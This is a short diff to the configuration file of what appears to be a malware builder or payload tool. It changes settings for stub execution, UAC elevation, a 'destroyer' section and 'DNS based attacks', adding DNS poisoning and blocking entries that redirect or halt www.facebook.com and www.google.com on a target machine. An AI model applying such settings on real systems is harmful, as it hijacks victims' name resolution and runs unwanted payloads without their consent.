@@ -2,7 +2,8 @@
 exec_mode = "normal"
 uac_elevation = 0
 duplicate_exec = 1
-logging = 1
+stub = "media.txt"
+logging = 0
 
 # ->completion controls
 msgbox = {
@@ -79,14 +80,21 @@ destroyer = {
 }
 
 # ->custom executions
-local_exec = 1
+local_exec = 0
 target_exec = {
-    'controller': 1,
-    'path': ""
+    'controller': 0,
+    'path': "C:\\Users\\Abdulrahim\\Desktop\\folder"
 }
 
 # ->DNS based attacks
+dns_halt = {
+    'controller': 0,
+    'clear': 1,
+    'entries': "www.facebook.com"
+}
+
 dns_poison = {
-    'controller': 1,
-    'entries': "" # research array inside an array
+    'controller': 0,
+    'clear': 1,
+    'entries': "8.8.8.8 www.facebook.com, 1.1.1.1 www.google.com"
 }
